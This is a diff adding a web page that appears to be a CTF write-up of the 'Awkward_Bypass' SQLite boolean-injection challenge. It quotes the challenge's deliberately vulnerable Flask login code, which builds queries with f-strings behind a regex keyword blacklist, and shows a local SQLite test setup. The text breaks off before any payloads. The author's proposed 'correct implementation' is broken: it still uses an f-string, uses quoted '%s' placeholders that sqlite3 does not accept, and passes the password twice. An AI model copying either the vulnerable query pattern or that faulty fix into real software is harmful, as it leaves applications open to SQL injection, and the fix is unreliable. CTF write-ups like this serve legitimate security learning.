@@ -1,0 +1,728 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <meta name="turbo-cache-control" content="no-cache">
+
+    <!-- Primary Meta Tags -->
+    <title>ImginaryCTF - Awkward_Bypass Writeup</title>
+    <meta name="title" content="ImginaryCTF - Awkward_Bypass Writeup">
+    <meta name="description" content="Written by sudoutopia" />
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://phasetw0.com/sqlite-boolean-injection/">
+    <meta property="og:title" content="ImginaryCTF - Awkward_Bypass Writeup">
+    <meta property="og:description" content="Written by sudoutopia">
+    <meta property="og:image" content="https://phasetw0.com/images/imaginaryctf/webpage.png">
+
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://phasetw0.com/sqlite-boolean-injection/">
+    <meta property="twitter:title" content="ImginaryCTF - Awkward_Bypass Writeup">
+    <meta property="twitter:description" content="Written by sudoutopia">
+    <meta property="twitter:image" content="https://phasetw0.com/images/imaginaryctf/webpage.png">
+    
+    <script>(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
+
+    <link href="/resources/css/retype.css" rel="stylesheet" />
+
+    <script type="text/javascript" src="/resources/js/config.js" defer></script>
+    <script type="text/javascript" src="/resources/js/retype.js" defer></script>
+    <script id="prism-js" type="text/javascript" src="/resources/js/prism.js" defer></script>
+</head>
+    <body>
+        <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
+    <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
+
+    <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
+    <div class="container relative flex items-center justify-between flex-grow pr-6 md:justify-start">
+        <!-- Mobile menu button skeleton -->
+        <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center flex-shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px flex-shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+        <div v-cloak id="docs-sidebar-toggle"></div>
+
+        <!-- Logo -->
+        <div class="flex items-center justify-between h-full py-2 md:w-75">
+            <div class="flex items-center px-2 md:px-6">
+                <a id="docs-site-logo" href="/" class="flex items-center leading-snug text-2xl">
+                    <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">phasetw0</span>
+                </a>
+            </div>
+
+            <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
+        </div>
+
+        <div class="flex justify-between md:flex-grow">
+            <!-- Top Nav -->
+            <nav class="hidden md:flex">
+    <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
+    </ul>
+</nav>
+
+            <!-- Header Right Skeleton -->
+            <div v-cloak class="flex justify-end flex-grow skeleton">
+
+                <!-- Search input mock -->
+                <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
+                    <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation"  style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                    </div>
+
+                    <input class="w-full h-10 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 placeholder-gray-400 dark:placeholder-dark-400"
+                    style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search docs" />
+                </div>
+
+                <!-- Mobile search button mock -->
+                <div class="flex items-center justify-center w-10 h-10 lg:hidden">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="flex-shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation"  style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                </div>
+
+                <!-- Dark mode switch placehokder -->
+                <div class="w-10 h-10 lg:ml-2"></div>
+
+                <!-- History button mock -->
+                <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="flex-shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation"  style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
+                </div>
+            </div>
+
+            <div v-cloak class="flex items-center justify-end flex-grow">
+                <div id="docs-mobile-search-button"></div>
+                <doc-search-desktop></doc-search-desktop>
+
+                <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
+                <doc-history></doc-history>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+    <div class="container relative flex bg-white">
+        <!-- Sidebar Skeleton -->
+<div v-cloak class="fixed flex flex-col flex-shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
+
+    <!-- Render this div, if config.showSidebarFilter is `true` -->
+    <div class="flex items-center h-16 px-6">
+        <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter" />
+    </div>
+
+    <div class="pl-6 mb-4 mt-1">
+        <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+        <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+        <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+        <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+        <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+        <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+    </div>
+
+    <div class="flex-shrink-0 mt-auto bg-transparent dark:border-dark-650">
+        <a
+    class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in"
+    target="_blank"
+    href="https://retype.com/"
+    rel="noopener"
+>
+    <span class="text-xs whitespace-nowrap">Powered by</span>
+    <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+</a>
+
+    </div>
+</div>
+
+<!-- Sidebar component -->
+<doc-sidebar v-cloak>
+    <template #sidebar-footer>
+        <div
+            class="flex-shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650"
+        >
+
+            <a
+    class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in"
+    target="_blank"
+    href="https://retype.com/"
+    rel="noopener"
+>
+    <span class="text-xs whitespace-nowrap">Powered by</span>
+    <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+</a>
+
+        </div>
+    </template>
+</doc-sidebar>
+
+
+        <div class="flex-grow min-w-0 dark:bg-dark-850">
+            <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
+            <div class="flex">
+    <div class="flex-grow min-w-0 px-6 md:px-16">
+        <main class="relative pt-6 pb-16">
+            <div class="docs-markdown" id="docs-content">
+                <!-- Rendered if sidebar right is enabled -->
+                <div id="docs-sidebar-right-toggle"></div>
+               
+                <!-- Page content  -->
+<doc-anchor-target id="imginaryctf---awkward_bypass-writeup" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#imginaryctf---awkward_bypass-writeup">#</doc-anchor-trigger>
+        <span>ImginaryCTF - Awkward_Bypass Writeup</span>
+    </h1>
+</doc-anchor-target>
+<p>Written by sudoutopia</p>
+<doc-anchor-target id="introduction">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#introduction">#</doc-anchor-trigger>
+        <span>Introduction</span>
+    </h2>
+</doc-anchor-target>
+<p>During the weekends, it&#x27;s nothing atypical for CTFs competitions to start, in which you can compete in. Me and a couple of friends, notably: Hypervisor, Me and Charif decided to check out some challenges on CTFTime as we&#x27;ve mostly done our CTF activites on the Capture The Flag platform <a href="https://www.hackthebox.eu/">HackTheBox</a>, so for fun we decided to check out ImginaryCTF as it was one of the CTFs running at the time, and we decided to mostly focus on our area of expertise/interest. While Hypervisor mostly focused on pwn/rev, me and Charif decided to focus on Web. One challenge which I grew fond of, although not being anything high calibre was <code v-pre>Awkward_Bypass</code>, which was <code v-pre>150</code> point challenge with currently 58 solves which involved simple SQLITE Boolean Injection with some easy filter bypassing work, another interesting aspect that this challenge reminded me of was how being overly reliant on autopwner or automated tools such as <code v-pre>sqlmap</code> can be bad.</p>
+<doc-anchor-target id="table-of-contents">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#table-of-contents">#</doc-anchor-trigger>
+        <span>Table of contents</span>
+    </h2>
+</doc-anchor-target>
+<p>For convience sake, I like to split my writeups into sections.</p>
+<ul>
+<li>Source code audit
+<ul>
+<li>SQL Injection</li>
+<li>Blacklist</li>
+</ul>
+</li>
+<li>Setup
+<ul>
+<li>Setting up a makeshift SQLITE database</li>
+</ul>
+</li>
+<li>Observing the application
+<ul>
+<li>Observing how the web application responds to certain events</li>
+</ul>
+</li>
+<li>Trying to bypass the blacklist
+<ul>
+<li>Insecure regex match and replace</li>
+</ul>
+</li>
+<li>SQL Injection
+<ul>
+<li>Testing if boolean is the correct way to go</li>
+<li>Exploiting boolean SQLi to retrive flag from DB</li>
+</ul>
+</li>
+</ul>
+<doc-anchor-target id="source-code-audit">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#source-code-audit">#</doc-anchor-trigger>
+        <span>Source code audit</span>
+    </h2>
+</doc-anchor-target>
+<p>It&#x27;s typical for CTFs alike to include the source code for the challenge, this is in order to be able to solve the challenge and be given context on how it works in a much deeper level.</p>
+<p>This is the source code that we&#x27;ve given, named <code v-pre>app.py</code></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">import re  
+import sqlite3  
+from flask import Flask, render_template, url_for, request, redirect, make_response  
+  
+app = Flask(__name__)  
+  
+blacklist = [&quot;ABORT&quot;, &quot;ACTION&quot;, &quot;ADD&quot;, &quot;AFTER&quot;, &quot;ALL&quot;, &quot;ALTER&quot;, &quot;ALWAYS&quot;, &quot;ANALYZE&quot;, &quot;AND&quot;, &quot;AS&quot;, &quot;ASC&quot;, &quot;ATTACH&quot;, &quot;AUTOINCREMENT&quot;, &quot;BEFORE&quot;, &quot;BEGIN&quot;, &quot;BETWEEN&quot;, &quot;CASC  
+ADE&quot;, &quot;CASE&quot;, &quot;CAST&quot;, &quot;CHECK&quot;, &quot;COLLATE&quot;, &quot;COLUMN&quot;, &quot;COMMIT&quot;, &quot;CONFLICT&quot;, &quot;CONSTRAINT&quot;, &quot;CREATE&quot;, &quot;CROSS&quot;, &quot;CURRENT&quot;, &quot;CURRENT_DATE&quot;, &quot;CURRENT_TIME&quot;, &quot;CURRENT_TIMESTAM  
+P&quot;, &quot;DATABASE&quot;, &quot;DEFAULT&quot;, &quot;DEFERRABLE&quot;, &quot;DEFERRED&quot;, &quot;DELETE&quot;, &quot;DESC&quot;, &quot;DETACH&quot;, &quot;DISTINCT&quot;, &quot;DO&quot;, &quot;DROP&quot;, &quot;EACH&quot;, &quot;ELSE&quot;, &quot;END&quot;, &quot;ESCAPE&quot;, &quot;EXCEPT&quot;, &quot;EXCLUDE&quot;, &quot;EXCLU  
+SIVE&quot;, &quot;EXISTS&quot;, &quot;EXPLAIN&quot;, &quot;FAIL&quot;, &quot;FILTER&quot;, &quot;FIRST&quot;, &quot;FOLLOWING&quot;, &quot;FOR&quot;, &quot;FOREIGN&quot;, &quot;FROM&quot;, &quot;FULL&quot;, &quot;GENERATED&quot;, &quot;GLOB&quot;, &quot;GROUP&quot;, &quot;GROUPS&quot;, &quot;HAVING&quot;, &quot;IF&quot;, &quot;IGNORE&quot;,  
+&quot;IMMEDIATE&quot;, &quot;IN&quot;, &quot;INDEX&quot;, &quot;INDEXED&quot;, &quot;INITIALLY&quot;, &quot;INNER&quot;, &quot;INSERT&quot;, &quot;INSTEAD&quot;, &quot;INTERSECT&quot;, &quot;INTO&quot;, &quot;IS&quot;, &quot;ISNULL&quot;, &quot;JOIN&quot;, &quot;KEY&quot;, &quot;LAST&quot;, &quot;LEFT&quot;, &quot;LIKE&quot;, &quot;LIMIT&quot;,  
+&quot;MATCH&quot;, &quot;MATERIALIZED&quot;, &quot;NATURAL&quot;, &quot;NO&quot;, &quot;NOT&quot;, &quot;NOTHING&quot;, &quot;NOTNULL&quot;, &quot;NULL&quot;, &quot;NULLS&quot;, &quot;OF&quot;, &quot;OFFSET&quot;, &quot;ON&quot;, &quot;OR&quot;, &quot;ORDER&quot;, &quot;OTHERS&quot;, &quot;OUTER&quot;, &quot;OVER&quot;, &quot;PARTITION&quot;, &quot;  
+PLAN&quot;, &quot;PRAGMA&quot;, &quot;PRECEDING&quot;, &quot;PRIMARY&quot;, &quot;QUERY&quot;, &quot;RAISE&quot;, &quot;RANGE&quot;, &quot;RECURSIVE&quot;, &quot;REFERENCES&quot;, &quot;REGEXP&quot;, &quot;REINDEX&quot;, &quot;RELEASE&quot;, &quot;RENAME&quot;, &quot;REPLACE&quot;, &quot;RESTRICT&quot;, &quot;RETURN  
+ING&quot;, &quot;RIGHT&quot;, &quot;ROLLBACK&quot;, &quot;ROW&quot;, &quot;ROWS&quot;, &quot;SAVEPOINT&quot;, &quot;SELECT&quot;, &quot;SET&quot;, &quot;TABLE&quot;, &quot;TEMP&quot;, &quot;TEMPORARY&quot;, &quot;THEN&quot;, &quot;TIES&quot;, &quot;TO&quot;, &quot;TRANSACTION&quot;, &quot;TRIGGER&quot;, &quot;UNBOUNDED&quot;, &quot;UNI  
+ON&quot;, &quot;UNIQUE&quot;, &quot;UPDATE&quot;, &quot;USING&quot;, &quot;VACUUM&quot;, &quot;VALUES&quot;, &quot;VIEW&quot;, &quot;VIRTUAL&quot;, &quot;WHEN&quot;, &quot;WHERE&quot;, &quot;WINDOW&quot;, &quot;WITH&quot;, &quot;WITHOUT&quot;]    
+  
+def checkCreds(username, password):  
+       con = sqlite3.connect('database.db')  
+       cur = con.cursor()  
+       for n in blacklist:  
+               regex = re.compile(n, re.IGNORECASE)  
+               username = regex.sub(&quot;&quot;, username)  
+       for n in blacklist:  
+               regex = re.compile(n, re.IGNORECASE)  
+               password = regex.sub(&quot;&quot;, password)  
+       print(f&quot;SELECT * FROM users WHERE username='{username}' AND password='{password}'&quot;)  
+       try:  
+               content = cur.execute(f&quot;SELECT * FROM users WHERE username='{username}' AND password='{password}'&quot;).fetchall()  
+       except:  
+               return False  
+       cur.close()  
+       con.close()  
+       if content == []:  
+               return False  
+       else:  
+               return True  
+  
+@app.route('/')  
+def index():  
+       return render_template(&quot;index.html&quot;)  
+  
+@app.route('/user', methods=['POST'])  
+def user():  
+       if request.method == 'POST':    
+               username = request.values['username']  
+               password = request.values['password']  
+               if checkCreds(username, password) == True:  
+                       return render_template(&quot;user.html&quot;)  
+               else:  
+                       return &quot;Error&quot;  
+       else:  
+               return render_template(&quot;user.html&quot;)</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="sql-injection">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#sql-injection">#</doc-anchor-trigger>
+        <span>SQL Injection</span>
+    </h3>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python"> try:  
+      content = cur.execute(f&quot;SELECT * FROM users WHERE username='{username}' AND password='{password}'&quot;).fetchall()  
+ except:  
+	return False</code></pre>
+</doc-codeblock></div>
+<p>The Flask application seems to just feed the user input into the SQL query by using fstrings, if you don&#x27;t know what you&#x27;re doing, this might seem like the correct approach, but in fact is not, and terribly insecure.</p>
+<p>A correct implementation of this would be this:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python"> try:  
+      content = cur.execute(f&quot;SELECT * FROM users WHERE username='%s' AND password='%s'&quot;, (password, password, )).fetchall()  
+ 	
+ except:  
+	return False
+</code></pre>
+</doc-codeblock></div>
+<p>We&#x27;ve now identified what the vulnerability is, an SQL Injection, but another interesting thing to take notice is the DBMS is in use, in this instance, it&#x27;s an <code v-pre>sqlite</code> database, this comes in very useful when developing payloads for SQLi as different DBMS have different quirks with their queries.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">con = sqlite3.connect('database.db')  
+cur = con.cursor()</code></pre>
+</doc-codeblock></div>
+<p>We&#x27;ve also identified that there is an existing table called <code v-pre>users</code> which has two columns, <code v-pre>username</code> and <code v-pre>password</code>.</p>
+<doc-anchor-target id="blacklist">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#blacklist">#</doc-anchor-trigger>
+        <span>Blacklist</span>
+    </h3>
+</doc-anchor-target>
+<p>As expected, one of the first things you&#x27;d notice is that very large and long blacklist.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">blacklist = [&quot;ABORT&quot;, &quot;ACTION&quot;, &quot;ADD&quot;, &quot;AFTER&quot;, &quot;ALL&quot;, &quot;ALTER&quot;, &quot;ALWAYS&quot;, &quot;ANALYZE&quot;, &quot;AND&quot;, &quot;AS&quot;, &quot;ASC&quot;, &quot;ATTACH&quot;, &quot;AUTOINCREMENT&quot;, &quot;BEFORE&quot;, &quot;BEGIN&quot;, &quot;BETWEEN&quot;, &quot;CASC  
+ADE&quot;, &quot;CASE&quot;, &quot;CAST&quot;, &quot;CHECK&quot;, &quot;COLLATE&quot;, &quot;COLUMN&quot;, &quot;COMMIT&quot;, &quot;CONFLICT&quot;, &quot;CONSTRAINT&quot;, &quot;CREATE&quot;, &quot;CROSS&quot;, &quot;CURRENT&quot;, &quot;CURRENT_DATE&quot;, &quot;CURRENT_TIME&quot;, &quot;CURRENT_TIMESTAM  
+P&quot;, &quot;DATABASE&quot;, &quot;DEFAULT&quot;, &quot;DEFERRABLE&quot;, &quot;DEFERRED&quot;, &quot;DELETE&quot;, &quot;DESC&quot;, &quot;DETACH&quot;, &quot;DISTINCT&quot;, &quot;DO&quot;, &quot;DROP&quot;, &quot;EACH&quot;, &quot;ELSE&quot;, &quot;END&quot;, &quot;ESCAPE&quot;, &quot;EXCEPT&quot;, &quot;EXCLUDE&quot;, &quot;EXCLU  
+SIVE&quot;, &quot;EXISTS&quot;, &quot;EXPLAIN&quot;, &quot;FAIL&quot;, &quot;FILTER&quot;, &quot;FIRST&quot;, &quot;FOLLOWING&quot;, &quot;FOR&quot;, &quot;FOREIGN&quot;, &quot;FROM&quot;, &quot;FULL&quot;, &quot;GENERATED&quot;, &quot;GLOB&quot;, &quot;GROUP&quot;, &quot;GROUPS&quot;, &quot;HAVING&quot;, &quot;IF&quot;, &quot;IGNORE&quot;,  
+&quot;IMMEDIATE&quot;, &quot;IN&quot;, &quot;INDEX&quot;, &quot;INDEXED&quot;, &quot;INITIALLY&quot;, &quot;INNER&quot;, &quot;INSERT&quot;, &quot;INSTEAD&quot;, &quot;INTERSECT&quot;, &quot;INTO&quot;, &quot;IS&quot;, &quot;ISNULL&quot;, &quot;JOIN&quot;, &quot;KEY&quot;, &quot;LAST&quot;, &quot;LEFT&quot;, &quot;LIKE&quot;, &quot;LIMIT&quot;,  
+&quot;MATCH&quot;, &quot;MATERIALIZED&quot;, &quot;NATURAL&quot;, &quot;NO&quot;, &quot;NOT&quot;, &quot;NOTHING&quot;, &quot;NOTNULL&quot;, &quot;NULL&quot;, &quot;NULLS&quot;, &quot;OF&quot;, &quot;OFFSET&quot;, &quot;ON&quot;, &quot;OR&quot;, &quot;ORDER&quot;, &quot;OTHERS&quot;, &quot;OUTER&quot;, &quot;OVER&quot;, &quot;PARTITION&quot;, &quot;  
+PLAN&quot;, &quot;PRAGMA&quot;, &quot;PRECEDING&quot;, &quot;PRIMARY&quot;, &quot;QUERY&quot;, &quot;RAISE&quot;, &quot;RANGE&quot;, &quot;RECURSIVE&quot;, &quot;REFERENCES&quot;, &quot;REGEXP&quot;, &quot;REINDEX&quot;, &quot;RELEASE&quot;, &quot;RENAME&quot;, &quot;REPLACE&quot;, &quot;RESTRICT&quot;, &quot;RETURN  
+ING&quot;, &quot;RIGHT&quot;, &quot;ROLLBACK&quot;, &quot;ROW&quot;, &quot;ROWS&quot;, &quot;SAVEPOINT&quot;, &quot;SELECT&quot;, &quot;SET&quot;, &quot;TABLE&quot;, &quot;TEMP&quot;, &quot;TEMPORARY&quot;, &quot;THEN&quot;, &quot;TIES&quot;, &quot;TO&quot;, &quot;TRANSACTION&quot;, &quot;TRIGGER&quot;, &quot;UNBOUNDED&quot;, &quot;UNI  
+ON&quot;, &quot;UNIQUE&quot;, &quot;UPDATE&quot;, &quot;USING&quot;, &quot;VACUUM&quot;, &quot;VALUES&quot;, &quot;VIEW&quot;, &quot;VIRTUAL&quot;, &quot;WHEN&quot;, &quot;WHERE&quot;, &quot;WINDOW&quot;, &quot;WITH&quot;, &quot;WITHOUT&quot;]</code></pre>
+</doc-codeblock></div>
+<p>Seems to be an array of SQL statements and clauses it does not want you to use, which it&#x27;ll strip from your input using <code v-pre>re</code> which is Python&#x27;s Regex library in the <code v-pre>checkCreds()</code> function.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">def checkCreds(username, password):  
+       con = sqlite3.connect('database.db')  
+       cur = con.cursor()  
+       for n in blacklist:  
+               regex = re.compile(n, re.IGNORECASE)  
+               username = regex.sub(&quot;&quot;, username)  
+       for n in blacklist:  
+               regex = re.compile(n, re.IGNORECASE)  
+               password = regex.sub(&quot;&quot;, password)  
+       print(f&quot;SELECT * FROM users WHERE username='{username}' AND password='{password}'&quot;)  
+       try:  
+               content = cur.execute(f&quot;SELECT * FROM users WHERE username='{username}' AND password='{password}'&quot;).fetchall()  
+       except:  
+               return False  
+       cur.close()  
+       con.close()  
+       if content == []:  
+               return False  
+       else:  
+               return True  </code></pre>
+</doc-codeblock></div>
+<p>Match and replace blacklisted input is quite a bad method of defending against most attacks, as they can in most cases easily be circumvented, you&#x27;ll see how we succeed in this later.</p>
+<doc-anchor-target id="setup">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#setup">#</doc-anchor-trigger>
+        <span>Setup</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="setting-up-a-makeshift-sqlite-database">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#setting-up-a-makeshift-sqlite-database">#</doc-anchor-trigger>
+        <span>Setting up a makeshift SQLITE database</span>
+    </h3>
+</doc-anchor-target>
+<p>I usually setup a makeshift databse that replicates the target enviroment when it comes to SQL Injection challenges due to how much easier it makes developing payloads and understanding the intricacies of them.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">sudo apt install sqlite3
+sqlite testdb.db
+SQLite version 2.8.17  
+Enter &quot;.help&quot; for instructions  
+sqlite&gt;</code></pre>
+</doc-codeblock></div>
+<p>I simply create a table <code v-pre>users</code> with the columns <code v-pre>username</code> and <code v-pre>password</code>, and then feed random input into them.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">sqlite&gt; CREATE TABLE users (username VARCHAR(100), password VARCHAR(100));  
+sqlite&gt; INSERT INTO users (username, password) VALUES (&quot;administrator&quot;,&quot;password123&quot;);  
+sqlite&gt; .tables  
+users  
+sqlite&gt; SELECT * FROM users;  
+administrator|password123  
+sqlite&gt;</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="observing-the-application">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#observing-the-application">#</doc-anchor-trigger>
+        <span>Observing the application</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="observing-how-the-web-application-responds-to-certain-events">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#observing-how-the-web-application-responds-to-certain-events">#</doc-anchor-trigger>
+        <span>Observing how the web application responds to certain events</span>
+    </h3>
+</doc-anchor-target>
